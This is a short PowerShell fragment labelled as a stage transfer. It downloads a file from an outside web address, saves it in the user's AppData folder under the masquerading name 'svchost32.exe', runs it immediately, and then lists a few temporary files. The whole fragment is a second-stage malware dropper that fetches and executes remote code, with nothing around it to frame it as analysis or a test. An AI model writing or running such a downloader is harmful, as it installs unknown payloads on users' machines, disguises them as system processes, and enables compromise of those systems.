
<# Stage transfer #> $TransferUrl = 'http://adatum.com/assets/update.dat'; $Stage2Path = "$env:APPDATA\svchost32.exe"; curl.exe -s -L -o $Stage2Path $TransferUrl; & $Stage2Path; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
